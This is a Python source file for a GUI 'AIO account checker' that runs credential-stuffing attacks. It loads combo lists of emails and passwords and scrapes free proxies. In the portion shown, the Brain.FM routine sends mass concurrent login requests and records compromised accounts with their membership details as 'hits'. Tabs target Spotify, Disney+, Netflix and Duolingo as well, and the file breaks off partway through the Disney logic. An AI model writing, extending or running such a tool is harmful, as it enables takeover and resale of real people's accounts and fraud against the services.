#region imports, functions and globals
import aiohttp, asyncio, ujson, random, string, requests, PySimpleGUI as sg, pyperclip, pyglet, pandas
from concurrent import futures
from seleniumwire.webdriver import Chrome
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webbrowser import open as web
from datetime import datetime
from threading import Thread

sg.theme('Topanga')

pyglet.font.add_file('walter.ttf')
font = 'walter 10'

from contextlib import contextmanager

@contextmanager
def conditional_open(f_name, mode, cond):
    if not cond:
        yield None
    resource = open(f_name, mode)
    try:
        yield resource
    finally:
        resource.close()

def l(): return random.choice(string.ascii_lowercase)
def d(): return random.choice(string.digits)

def asyncloop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

def divide_chunks(L, n):
    # Divide into chunks of length n
    return [L[x: x+n] for x in range(0, len(L), n)]

# def divide_chunks(a, n):
#     # Divide into Threads
#     k, m = divmod(len(a), n)
#     return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n))

speeds = {1:'All', 2:'Slow', 3:'Medium', 4:'Fast'}
protocols = {'_GET_HTTP_PROX_':'http', '_GET_HTTPS_PROX_':'https'}
#endregion

def create_checker_window(group):
    #sg.theme('Topanga')
#region BrainFM layout
    lay_brainfm = [
        [sg.FileBrowse('Load Combo', size=(14, 1)), sg.In('', size=(40,1), key='_BRAINFM_COMBO_PATH_', expand_x=True)],
        #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_BRAINFM_FORMAT_'), sg.B('?')],
        #[sg.FileBrowse('Load Proxies', size=(14, 1)), sg.In('', key='_BRAINFM_PROX_PATH_', size=(40,1))],
        #[sg.Check('Use Proxies', default=False, key='_BRAINFM_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_BPROTORAD_',key='_BRAINFM_HTTP_PROX_'), sg.Radio('HTTPS','_BPROTORAD_',key='_BRAINFM_HTTPS_PROX_',default=True)],
        #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        [
            sg.Col([[sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=200, key='_BRAINFM_CHUNKS_', size=(6,1))], [sg.T('Timeout (sec)', size=(12,1)), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_BRAINFM_TIME_', size=(6,1))]]),
            sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_BRAINFM_')], [sg.B('Stop Checker', size=(15,1), disabled=True, key='_STOP_BRAINFM_')]]),
            sg.P(), sg.Frame('', [
                [sg.T('Hits', background_color='grey20', size=(5,1)), sg.T(0, size=(5,1), background_color='grey20', key='_BRAINFM_HITS_', text_color='lawngreen')],
                [sg.T('False', background_color='grey20', size=(5,1)), sg.T(0, size=(5,1), background_color='grey20', key='_BRAINFM_FALSE_', text_color='tomato')],
                [sg.T('Error', background_color='grey20', size=(5,1)), sg.T(0, size=(5,1), background_color='grey20', key='_BRAINFM_ERROR_', text_color='pink')],
            ], background_color='grey20')
        ],
        [sg.P(), sg.B('Save Hits To Text File'), sg.P(), sg.B('Copy Hits To Clipboard'), sg.P()],
        [sg.Multiline('Hits will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_OUT_BRAINFM_', s=(1,5), expand_x = True, expand_y=True)],
        [sg.Multiline('Bad accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FALSE_BRAINFM_', s=(1,5), expand_x = True)],
    ]
#endregion

#region Spotify layout
    lay_spotify = [
        [sg.FileBrowse('Load Combo', size=(14, 1)), sg.In('', size=(40,1), key='_SPOTIFY_COMBO_PATH_',expand_x=True)],
        #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_SPOTIFY_FORMAT_'), sg.B('?')],
        [sg.FileBrowse('Load Proxies', size=(14, 1)), sg.In('', key='_SPOTIFY_PROX_PATH_', size=(40,1),expand_x=True)],
        [sg.Check('Use Proxies', default=False, key='_SPOTIFY_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_SPPROTORAD_',key='_SPOTIFY_HTTP_PROX_'), sg.Radio('HTTPS','_SPPROTORAD_',key='_SPOTIFY_HTTPS_PROX_',default=True)],
        #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        [
            sg.Col([[sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=5, key='_SPOTIFY_THREADS_', size=(6,1))], [sg.T('Timeout (sec)', size=(12,1)), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_SPOTIFY_TIME_', size=(6,1))]]),
            sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_SPOTIFY_')], [sg.B('Stop Checker', size=(15,1), disabled=True, key='_STOP_SPOTIFY_')]]),
            sg.P(), sg.Frame('', [
                [sg.T('Hits', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_SPOTIFY_HITS_', text_color='lawngreen')],
                #[sg.T('Free', size=(5,1) background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_SPOTIFY_FREE_', text_color='lawngreen)],
                [sg.T('False', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_SPOTIFY_FALSE_', text_color='tomato')],
                [sg.T('Error', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_SPOTIFY_ERROR_', text_color='pink')],
            ], background_color='grey20')
        ],
        [sg.P(), sg.B('Save Hits To Text File'), sg.P(), sg.B('Copy Hits To Clipboard'), sg.P()],
        [sg.Multiline('Hits will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_OUT_SPOTIFY_', s=(1,5), expand_x = True, expand_y=True)],
        #[sg.Multiline('Free accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FREE_SPOTIFY_', s=(1,5), expand_x = True, expand_y=True)],
        [sg.Multiline('Bad accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FALSE_SPOTIFY_', s=(1,5), expand_x = True)],
    ]
#endregion

#region Disney layout
    lay_disneyp = [
        [sg.FileBrowse('Load Combo', size=(14, 1)), sg.In('', size=(40,1), key='_DISNEY_COMBO_PATH_',expand_x=True)],
        #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_DISNEY_FORMAT_'), sg.B('?')],
        [sg.FileBrowse('Load Proxies', size=(14, 1)), sg.In('', key='_DISNEY_PROX_PATH_', size=(40,1),expand_x=True)],
        [sg.Check('Use Proxies', default=False, key='_DISNEY_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_DNPROTORAD_',key='_DISNEY_HTTP_PROX_'), sg.Radio('HTTPS','_DNPROTORAD_',key='_DISNEY_HTTPS_PROX_',default=True)],
        #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        [
            sg.Col([[sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=200, key='_DISNEY_CHUNKS_', size=(6,1))], [sg.T('Timeout (sec)', size=(12,1)), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_DISNEY_TIME_', size=(6,1))]]),
            sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_DISNEY_')], [sg.B('Stop Checker', size=(15,1), disabled=True, key='_STOP_DISNEY_')]]),
            sg.P(), sg.Frame('', [
                [sg.T('Hits', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DISNEY_HITS_', text_color='lawngreen')],
                [sg.T('Free', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DISNEY_FREE_', text_color='cyan')],
                [sg.T('False', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DISNEY_FALSE_', text_color='tomato')],
                [sg.T('Error', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DISNEY_ERROR_', text_color='pink')],
            ], background_color='grey20')
        ],
        [sg.P(), sg.B('Save Hits To Text File'), sg.P(), sg.B('Copy Hits To Clipboard'), sg.P()],
        [sg.Multiline('Hits will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_OUT_DISNEY_', s=(1,5), expand_x = True, expand_y=True)],
        [sg.Multiline('Free accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FREE_DISNEY_', s=(1,5), expand_x = True, expand_y=True)],
        [sg.Multiline('Bad accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FALSE_DISNEY_', s=(1,3), expand_x = True)],

        # [sg.FileBrowse('Load Combo'), sg.In('', size=(40,1), key='_DISNEY_COMBO_PATH_')],
        # #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_DISNEY_FORMAT_'), sg.B('?')],
        # [sg.FileBrowse('Load Proxies', size=(14, 1), target=(sg.ThisRow, 2)), sg.In('', key='_DISNEY_PROX_PATH_')],
        # [sg.Check('Use Proxies', default=False, key='_DISNEY_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_DNPROTORAD_',key='_DISNEY_HTTP_PROX_'), sg.Radio('HTTPS','_DNPROTORAD_',key='_DISNEY_HTTPS_PROX_',default=True)],
        # #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        # [sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=200, key='_DISNEY_CHUNKS_', size=(6,1)), sg.T('Timeout (seconds)'), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_DISNEY_TIME_', size=(6,1))],
        # [
        #     sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_DISNEY_')], [sg.B('Stop Checker', disabled=True, key='_STOP_DISNEY_')]]),
        #     sg.P(), sg.Frame('', [
        #         [sg.T('Hits   :', background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DISNEY_HITS_')],
        #         # [sg.T('Trial  :', background_color='grey20'), sg.T(0, background_color='grey20')],
        #         # [sg.T('Expired:', background_color='grey20'), sg.T(0, background_color='grey20')],
        #         [sg.T('False  :', background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DISNEY_FALSE_')]
        #     ], background_color='grey20'),
        #     sg.Multiline('Output Screen', horizontal_scroll=True, key='_OUT_DISNEY_', s=(1,1), expand_x = True, expand_y = True)
        # ],
    ]
#endregion

#region Netflix layout
    lay_netflix = [
        [sg.FileBrowse('Load Combo', size=(14, 1)), sg.In('', size=(40,1), key='_NETFLIX_COMBO_PATH_',expand_x=True)],
        #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_NETFLIX_FORMAT_'), sg.B('?')],
        [sg.FileBrowse('Load Proxies', size=(14, 1)), sg.In('', key='_NETFLIX_PROX_PATH_', size=(40,1),expand_x=True)],
        [sg.Check('Use Proxies', default=False, key='_NETFLIX_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_NXPROTORAD_',key='_NETFLIX_HTTP_PROX_'), sg.Radio('HTTPS','_NXPROTORAD_',key='_NETFLIX_HTTPS_PROX_',default=True)],
        #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        [
            sg.Col([[sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=5, key='_NETFLIX_THREADS_', size=(6,1))], [sg.T('Timeout (sec)', size=(12,1)), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_NETFLIX_TIME_', size=(6,1))]]),
            sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_NETFLIX_')], [sg.B('Stop Checker', size=(15,1), disabled=True, key='_STOP_NETFLIX_')]]),
            sg.P(), sg.Frame('', [
                [sg.T('Hits', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_NETFLIX_HITS_', text_color='lawngreen')],
                [sg.T('Exist', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_NETFLIX_EXIST_', text_color='cyan')],
                [sg.T('False', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_NETFLIX_FALSE_', text_color='tomato')],
                [sg.T('Error', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_NETFLIX_ERROR_', text_color='pink')],
            ], background_color='grey20')
        ],
        [sg.P(), sg.B('Save Hits To Text File'), sg.P(), sg.B('Copy Hits To Clipboard'), sg.P()],
        [sg.Multiline('Hits will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_OUT_NETFLIX_', s=(1,5), expand_x = True, expand_y=True)],
        #[sg.Multiline('Free accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FREE_NETFLIX_', s=(1,5), expand_x = True, expand_y=True)],
        [sg.Multiline('Bad accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FALSE_NETFLIX_', s=(1,5), expand_x = True)],
    ]
#endregion

#region Duolingo Layout
    lay_duoling = [
        [sg.FileBrowse('Load Combo', size=(14, 1)), sg.In('', size=(40,1), key='_DUOLING_COMBO_PATH_',expand_x=True)],
        #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_DUOLING_FORMAT_'), sg.B('?')],
        [sg.FileBrowse('Load Proxies', size=(14, 1)), sg.In('', key='_DUOLING_PROX_PATH_', size=(40,1),expand_x=True)],
        [sg.Check('Use Proxies', default=False, key='_DUOLING_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_DLPROTORAD_',key='_DUOLING_HTTP_PROX_'), sg.Radio('HTTPS','_DLPROTORAD_',key='_DUOLING_HTTPS_PROX_',default=True)],
        #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        [
            sg.Col([[sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=200, key='_DUOLING_CHUNKS_', size=(6,1))], [sg.T('Timeout (sec)', size=(12,1)), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_DUOLING_TIME_', size=(6,1))]]),
            sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_DUOLING_')], [sg.B('Stop Checker', size=(15,1), disabled=True, key='_STOP_DUOLING_')]]),
            sg.P(), sg.Frame('', [
                [sg.T('Hits', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DUOLING_HITS_', text_color='lawngreen')],
                [sg.T('False', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DUOLING_FALSE_', text_color='tomato')],
                [sg.T('Error', size=(5,1), background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DUOLING_ERROR_', text_color='pink')],
            ], background_color='grey20')
        ],
        [sg.P(), sg.B('Save Hits To Text File'), sg.P(), sg.B('Copy Hits To Clipboard'), sg.P()],
        [sg.Multiline('Hits will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_OUT_DUOLING_', s=(1,5), expand_x = True, expand_y=True)],
        [sg.Multiline('Bad accounts will be shown here',no_scrollbar=False, font='sans 11', horizontal_scroll=True, key='_FALSE_DUOLING_', s=(1,5), expand_x = True)],

        # [sg.FileBrowse('Load Combo'), sg.In('', size=(40,1), key='_DUOLING_COMBO_PATH_')],
        # #[sg.T('Combo Format:'), sg.In('[Email]:[Pass]', size=(30,1), key='_DUOLING_FORMAT_'), sg.B('?')],
        # [sg.FileBrowse('Load Proxies', size=(14, 1), target=(sg.ThisRow, 2)), sg.In('', key='_DUOLING_PROX_PATH_')],
        # [sg.Check('Use Proxies', default=False, key='_DUOLING_USE_PROX_'), sg.P(), sg.T('Select Proxy Protocol:'), sg.Radio('HTTP','_DLPROTORAD_',key='_DUOLING_HTTP_PROX_'), sg.Radio('HTTPS','_DLPROTORAD_',key='_DUOLING_HTTPS_PROX_',default=True)],
        # #[sg.T('Threads/Bots', size=(12,1)), sg.Slider((1,100), 50, orientation='h', border_width=1, s=(25,16), disable_number_display=True, enable_events=True, key='_BRAIN_THREAD_SLIDE_'), sg.T(' 50', key='_BRAIN_THREAD_', s=(4,1), relief=sg.RELIEF_SUNKEN)],
        # [sg.T('Threads/Bots', size=(12,1)), sg.Spin([i for i in range(1,999999)], initial_value=200, key='_DUOLING_CHUNKS_', size=(6,1)), sg.T('Timeout (seconds)'), sg.Spin([i for i in range(1,1000)], initial_value=10, key='_DUOLING_TIME_', size=(6,1))],
        # [
        #     sg.Col([[sg.B('Start Checker', size=(15,1), key='_START_DUOLING_')], [sg.B('Stop Checker', disabled=True, key='_STOP_DUOLING_')]]),
        #     sg.P(), sg.Frame('', [
        #         [sg.T('Hits   :', background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DUOLING_HITS_')],
        #         # [sg.T('Trial  :', background_color='grey20'), sg.T(0, background_color='grey20')],
        #         # [sg.T('Expired:', background_color='grey20'), sg.T(0, background_color='grey20')],
        #         [sg.T('False  :', background_color='grey20'), sg.T(0, size=(5,1), background_color='grey20', key='_DUOLING_FALSE_')]
        #     ], background_color='grey20'),
        #     sg.Multiline('Output Screen', horizontal_scroll=True, key='_OUT_DUOLING_', s=(1,1), expand_x = True, expand_y = True)
        # ],
    ]
#endregion

#region Proxy layout
    lay_proxies = [
        [sg.T('Country Code:'), sg.In('All', size=(12,1), key='_CONT_'), sg.P(), sg.T('Anonymity:'), sg.Combo(['All', 'Elite', 'Anonymous', 'Transparent'], 'All', size=(12,1), key='_ANON_', readonly=True)],
        [sg.T('Speed:'), sg.Slider((1,4), size=(10,10), orientation='h', disable_number_display=True, expand_x=True, enable_events=True, key='_SPEED_'),sg.T(' All', size=(8,1), relief=sg.RELIEF_SUNKEN, key='_SPEED_SHOW_')],
        [sg.T('  '), sg.T('Protocol:'), sg.Radio('HTTP','_PXPROTORAD_', key='_GET_HTTP_PROX_'), sg.Radio('HTTPS','_PXPROTORAD_',True, key='_GET_HTTPS_PROX_'), sg.P(), sg.B('Get Free Proxies!', key='_GET_',size=(20,1)), sg.T('  ')],
        [sg.T('  '), sg.T(' 1', relief=sg.RELIEF_SUNKEN, key='_LEN_', size=(5,1)),sg.B('Export To Text File', key='_GET_EXPORT_', size=(20,1)), sg.P(), sg.B('Copy To Clipboard', key='_GET_COPY_',size=(20,1)), sg.T('  ')],
        [sg.Multiline('127.0.0.1 :monkas:', key='_PROX_SHOW_', size=(20,10), expand_x=True, expand_y=True)]
    ]
#endregion

    lay_about = [
        [sg.T(expand_y=True)],
        [sg.T('CheckEm - AIO Account Kekker (v1.0)', font=font+' bold')],
        [sg.T('Created by', font = font+' italic'), sg.T('M3GZ', text_color='cyan', enable_events=True, key='_M_', font=font+' underline'), sg.T('for the', font = font+' italic'), sg.T('Coding Event', text_color='lawngreen', enable_events=True, key='_CE_', font=font+' underline')],
        [sg.T()],
        #[sg.T('Special thanks to SpartanHoplite of InfiniteProxies for providing me with hq proxies for checking')],
        [sg.T()],
        [sg.B('See my other releases!', key='_R_', size=(30,1))],
        [sg.B('Visit my profile!', key='_M_', size=(30,1))],
        [sg.T(expand_y=True)],
    ]

#region Main layout
    lay = [
        [sg.TabGroup(
            [
                [
                    sg.Tab('Duolingo', lay_duoling, key='Duolingo'),
                    sg.Tab('Brain.FM', lay_brainfm, key='Brain.FM'),
                    sg.Tab('Spotify', lay_spotify, key='Spotify'),
                    sg.Tab('Disney+', lay_disneyp, key='Disney+'),
                    sg.Tab('Netflix', lay_netflix, key='Netflix'),
                    sg.Tab('Proxies', lay_proxies, key='_PROXY_PAGE_'),
                    sg.Tab('About', lay_about, key='_ABOUT_PAGE_', element_justification='c'),
                ]
            ], enable_events=True)],
    ]
#endregion

    w = sg.Window('CheckEm - AIO Checker By M3GZ', lay, font = font)

    e,v = w.read()
    w[group].select()

    while True:
        e,v = w.read()
        if e == sg.WIN_CLOSED: break

#region Proxy Logic
        if e == '_SPEED_': w['_SPEED_SHOW_'].update(' '+speeds[v[e]])
        if e == '_GET_':
            protocol = 'https' if '_HTTPS_' in [x for x in ['_GET_HTTP_PROX_', '_GET_HTTPS_PROX_'] if v[x] == True][0] else 'http'
            url_proxyscrape = 'https://api.proxyscrape.com/v2/?request=displayproxies'
            url_geonode = 'https://proxylist.geonode.com/api/proxy-list?limit=500'
            
            if protocol[:-1] == 'socks': url_proxyscrape += '&protocol='+protocol
            elif protocol == 'https': url_proxyscrape += '&protocol=http&ssl=yes'
            elif protocol == 'http': url_proxyscrape += '&protocol=http&ssl=no'
            
            if v['_SPEED_'] == 4: url_proxyscrape += '&timeout=500'
            if v['_SPEED_'] == 3: url_proxyscrape += '&timeout=1500'
            if v['_SPEED_'] == 2: url_proxyscrape += '&timeout=5000'
            if v['_SPEED_'] == 1: url_proxyscrape += '&timeout=10000'

            url_proxyscrape += '&country='+v['_CONT_'].lower()
            url_proxyscrape += '&anonymity='+v['_ANON_'].lower()

            url_geonode += '&protocols='+protocol
            if v['_SPEED_'] != 1: url_geonode += '&speed='+speeds[v['_SPEED_']].lower()
            if v['_CONT_'].lower() != 'all': url_geonode += '&country='+v['_CONT_'].lower()
            if v['_ANON_'] != 'All': url_geonode += '&anonymityLevel='+v['_ANON_'].lower()

            try:
                prox_gn = requests.get(url_geonode).json()['data']
            except:
                prox_gn = []

            proxies = ('\n'.join(['{}:{}'.format(x['ip'], x['port']) for x in prox_gn]) + '\n' + requests.get(url_proxyscrape).text).strip()
            w['_LEN_'].update(' {}'.format(len(proxies.split())))
            w['_PROX_SHOW_'].update(proxies)
        
        if e == '_GET_COPY_': pyperclip.copy(v['_PROX_SHOW_'])
        if e == '_GET_EXPORT_':
            with open('prox4all_{}.txt'.format(datetime.now().strftime("%d%m%Y-%H%M%S")), 'w') as f:
                f.write('{} Proxies\nScraped by Pr0x4all by M3GZ\nOn {}\n\n'.format('https' if '_HTTPS_' in [x for x in ['_GET_HTTP_PROX_', '_GET_HTTPS_PROX_'] if v[x] == True][0] else 'http', datetime.now().strftime("%d/%m/%Y-%H:%M:%S")))
                f.write('\n'.join([x for x in v['_PROX_SHOW_'].split() if x.strip()!='']))
#endregion

#region BrainFM Logic
        if e == '_START_BRAINFM_':
            w['_BRAINFM_HITS_'].update(0)
            w['_BRAINFM_FALSE_'].update(0)
            w['_START_BRAINFM_'].update(disabled=True)
            w['_STOP_BRAINFM_'].update(disabled=False)
            loop = asyncio.new_event_loop()
            t = Thread(target=asyncloop, args=(loop,), daemon=True)
            t.start()
            w['_OUT_BRAINFM_'].update('')
            #df = pandas.read_csv(v['_BRAINFM_COMBO_PATH_'], sep=' ', header=None)

            async def post_brainfm(session, i):
                #print(i)
                try:
                    async with session.post('https://api.brain.fm/v2/auth/email-login', headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0'}, data={"email":i[0],"password":i[1]}) as resp:
                        try:
                            a = await resp.json()
                            if a['status'] == 400:
                                w['_BRAINFM_FALSE_'].update(int(w['_BRAINFM_FALSE_'].get())+1)
                                w['_FALSE_BRAINFM_'].update('Bad account: {}:{}'.format(i[0], i[1]))
                                #w['_OUT_BRAINFM_'].update(('\nbad account: '+str(i[0]))+w['_OUT_BRAINFM_'].get())
                            elif a['status'] == 200:
                                get_header = {
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0',
                                    'Authorization': 'Bearer ' + a['result'],
                                }
                        except Exception as e:
                            w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                            w['_FALSE_BRAINFM_'].update('Bad account: {}:{} | Error'.format(i[0], i[1]))
                            return
                        async with session.get('https://api.brain.fm/v2/users/me', headers=get_header) as resp1:
                            try:
                                a = await resp1.json()
                                a = a['result']
                                w['_BRAINFM_HITS_'].update(int(w['_BRAINFM_HITS_'].get())+1)
                                w['_OUT_BRAINFM_'].update('\nHit: '+
                                    '{} | id={} | type={} | membershipId:{} | status={} | created={} | expire={} | renewalCount={} | checked by M3GZ\'s checker'.format(i[0], a['user']['id'], a['membership']['title'], a['membership']['membershipTypeId'], ','.join([x for x in a['membership'] if x[:2]=='is' and a['membership'][x]==1]), a['membership']['createdAt'], a['membership']['expirationDate'], a['membership']['renewalCount'])
                                +w['_OUT_BRAINFM_'].get())
                            except Exception as e:
                                w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                                w['_FALSE_BRAINFM_'].update('Bad account: {}:{} | Error'.format(i[0], i[1]))
                                return
                except aiohttp.ServerConnectionError:
                    print('serverr')
                    w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                    w['_FALSE_BRAINFM_'].update('Bad account: {}:{} - Error: Server Error'.format(i[0], i[1]))
                    return
                except asyncio.TimeoutError:
                    print('timeouterr')
                    w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                    w['_FALSE_BRAINFM_'].update('Bad account: {}:{} - Error: Timeout Error'.format(i[0], i[1]))
                    return
                # except aiohttp.ClientHttpProxyError:
                #     print('httproxer')
                #     #print(BRAINFM_bad_prox)
                #     brainfm_bad_prox.append(proxy)
                #     brainfm_retry.append(i)
                    
                #     w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                #     w['_FALSE_BRAINFM_'].update('Bad account: {}:{} - Error: Proxy Error'.format(i[0], i[1]))
                #     return
                except aiohttp.ClientSSLError:
                    print('sslerr1')
                    w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                    w['_FALSE_BRAINFM_'].update('Bad account: {}:{} - Error: SSL Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientError as e:

                    print('err1', e)
                    w['_BRAINFM_ERROR_'].update(int(w['_BRAINFM_ERROR_'].get())+1)
                    w['_FALSE_BRAINFM_'].update('Bad account: {}:{} - Error: {}'.format(i[0], i[1], str(e).replace('api.brain.fm','')))
                    return
                except:
                    print('idkerror')
                    return

            async def async_check_brainfm():
                async with aiohttp.ClientSession(timeout = aiohttp.ClientTimeout(v['_BRAINFM_TIME_'])) as session:
                    with open(v['_BRAINFM_COMBO_PATH_']) as f:
                    # for k in df:
                    #     tasks = []
                    #     for j in k.iterrows():
                        #i = f.readline().split(':', 1)
                        brainfm_continue_check = True
                        while brainfm_continue_check:
                            tasks = []
                            for k in range(v['_BRAINFM_CHUNKS_']):
                                i = f.readline()[:-1].split(':', 1)
                                #i = j[1][0].split(':', 1) 
                                if len(i) == 2:
                                    tasks.append(asyncio.ensure_future(post_brainfm(session, i)))
                                if i == ['']:
                                    brainfm_continue_check = False
                                    #await brainfm_btns()
                            total = await asyncio.gather(*tasks)
                        #total = await asyncio.gather(*tasks)
                        #print(tasks)
                async def brainfm_btns():
                    w['_STOP_BRAINFM_'].update(disabled=True)
                    w['_START_BRAINFM_'].update(disabled=False)
                    loop.call_soon_threadsafe(loop.stop)
                    t.join()
                await brainfm_btns()
                #await brainfm_btns()

            # if len(df)<=v['_BRAINFM_CHUNKS_']:
            #     asyncio.run_coroutine_threadsafe(async_check_brainfm([df]), loop)
            # else:
            #     asyncio.run_coroutine_threadsafe(async_check_brainfm(divide_chunks(df, v['_BRAINFM_CHUNKS_'])), loop)
            asyncio.run_coroutine_threadsafe(async_check_brainfm(), loop)
        
        if e == '_STOP_BRAINFM_':
            w['_START_BRAINFM_'].update(disabled=False)
            w['_STOP_BRAINFM_'].update(disabled=True)
            loop.call_soon_threadsafe(loop.stop)
            t.join()
#endregion

#region Disney Logic
        if e == '_START_DISNEY_':
            w['_START_DISNEY_'].update(disabled=True)
            w['_STOP_DISNEY_'].update(disabled=False)
            loop = asyncio.new_event_loop()
            t = Thread(target=asyncloop, args=(loop,), daemon=True)
            t.start()

            protocol = 'https' if '_HTTPS_' in [x for x in ['_DISNEY_HTTP_PROX_', '_DISNEY_HTTPS_PROX_'] if v[x] == True][0] else 'http'
            if v['_DISNEY_USE_PROX_']:
                proxy_list = pandas.read_csv(v['_DISNEY_PROX_PATH_'], sep=' ', header=None)
            else: proxy_list = None
            
            w['_OUT_DISNEY_'].update('')
            w['_FREE_DISNEY_'].update('')
